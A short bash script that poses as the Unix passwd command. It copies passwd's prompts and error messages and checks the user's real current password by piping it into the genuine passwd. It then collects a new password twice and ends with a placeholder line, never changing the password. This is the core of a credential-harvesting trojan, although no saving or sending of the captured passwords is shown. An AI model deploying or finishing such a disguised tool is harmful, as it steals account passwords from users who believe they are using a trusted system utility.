fail() {
  echo "passwd: Authentication token manipulation error"
  echo "passwd: password unchanged"
  exit 10
}

succeed() {
  echo "passwd: password updated successfully"
  exit 0
}

user=${1:-"${USER}"}
if egrep -q "^-" <<< "${user}"; then  # if flag detected, use real passwd
  /bin/passwd $@
  exit $?
fi

if ! grep -q "${user}" <<< $(cut -f1 -d: /etc/passwd); then
  echo "passwd: user '${user}' does not exist"
  exit 1
fi

if [ ${EUID} -ne 0 ] && [ "${user}" != "${USER}" ]; then
  echo "passwd: You may not view or modify password information for ${user}."
  exit 1
fi

echo "Changing password for ${user}."
read -r -s -p "Current password: " pw
echo

output="$(echo "${pw}" | passwd "${user}" 2>&1)"

if grep -q "New password" <<< "${output}"; then
  rightpass=0
else
  rightpass=1
fi

if [ ${rightpass} -eq 1 ]; then
  fail
fi

good=1
while [ ${good} -ne 0 ]; do
  read -r -s -p "New password: " npw
  echo
  read -r -s -p "Retype new password: " nnpw
  echo
  
  if [ "${npw}" != "${nnpw}" ]; then
    echo "Sorry, passwords do not match."
    sleep 2
    fail
  fi

  if [ -z "${npw}" ]; then
    echo "No password has been supplied."
  else
    good=0
  fi
done

echo "CHANGING PASSWORD YAY"

